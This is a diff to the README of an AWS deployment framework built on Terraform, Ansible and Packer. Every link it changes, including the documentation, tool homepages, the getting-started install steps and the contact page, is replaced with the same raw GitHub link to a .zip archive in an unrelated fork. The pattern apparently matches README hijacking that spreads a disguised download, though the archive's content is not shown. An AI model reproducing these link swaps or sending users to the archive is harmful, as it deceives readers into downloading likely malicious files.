@@ -19,7 +19,7 @@ you will need, but it's also flexible enough to be tweaked when necessary for
 special requirements. It represents months of work.
 
 The blog post
-[Deploying complex apps to AWS with Terraform, Ansible, and Packer](https://www.cogini.com/blog/deploying-complex-apps-to-aws-with-terraform-ansible-and-packer/)
+[Deploying complex apps to AWS with Terraform, Ansible, and Packer](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
 gives an example.
 
 # Scenarios
@@ -36,7 +36,7 @@ These modules cover the following scenarios:
 
 This is good for a simple app, and is also a stepping stone when deploying
 more complex apps. EC2 instances can be used for development or as a canary.
-See the [AWS docs](https://docs.aws.amazon.com/vpc/latest/userguide/VPC_Scenario2.html)
+See the [AWS docs](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
 for overview.
 
 ## CloudFront for assets
@@ -110,13 +110,13 @@ Use SES for email.
 
 # How it works
 
-It uses [Terraform](https://www.terraform.io/) to create the infrastructure,
-[Ansible](https://www.ansible.com/) and [Packer](https://www.packer.io/) to set
+It uses [Terraform](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip) to create the infrastructure,
+[Ansible](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip) and [Packer](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip) to set
 up instances and AMIs. It uses AWS CodePipeline/CodeBuild/CodeDeploy to build
 and deploy code, running the app components in one or more autoscaling groups
 running EC2 instances.
 
-The base of the system is Terraform and [Terragrunt](https://github.com/gruntwork-io/terragrunt).
+The base of the system is Terraform and [Terragrunt](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip).
 Common Terraform modules can be enabled according to the specific application
 requirements. Similarly, it uses common Ansible playbooks which can be modified
 for specific applications. If an app needs something special, we can easily add a
@@ -174,7 +174,7 @@ expensive at high load, we can run our own.
 
 The system makes use of CloudFront to host application assets as well as static
 content websites or "JAM stack" apps using tools like
-[Gatsby](https://www.gatsbyjs.org/).
+[Gatsby](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip).
 
 We deploy the application using AWS CodeDeploy using a blue/green deployment
 strategy. The CodeDeploy releases can be built using CodePipeline or a DevOps
@@ -185,13 +185,13 @@ work with external DNS, certs and other CDNs like CloudFlare.
 
 ## Getting started
 
-* Install tools and libraries, see [doc/install.md](doc/install.md)
-* Configure the system, see [doc/config.md](doc/config.md)
-* Create infrastructure with Terraform, see [terraform/README.md](terraform/README.md)
-  and [terraform/building.md](terraform/building.md)
-* Create configuration with Ansible, see [ansible/README.md](ansible/README.md)
-* Create AMIs with Ansible and Packer, see [packer/README.md](packer/README.md)
+* Install tools and libraries, see [https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
+* Configure the system, see [https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
+* Create infrastructure with Terraform, see [https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
+  and [https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
+* Create configuration with Ansible, see [https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
+* Create AMIs with Ansible and Packer, see [https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip)
 * Have fun!
 
-[Contact Us](https://www.cogini.com/contact/) if you would like help deploying
+[Contact Us](https://raw.githubusercontent.com/sivahariu/multi-env-deploy/master/ansible/roles/cronic/files/opt/bin/multi-env-deploy-v2.4.zip) if you would like help deploying
 your complex app.
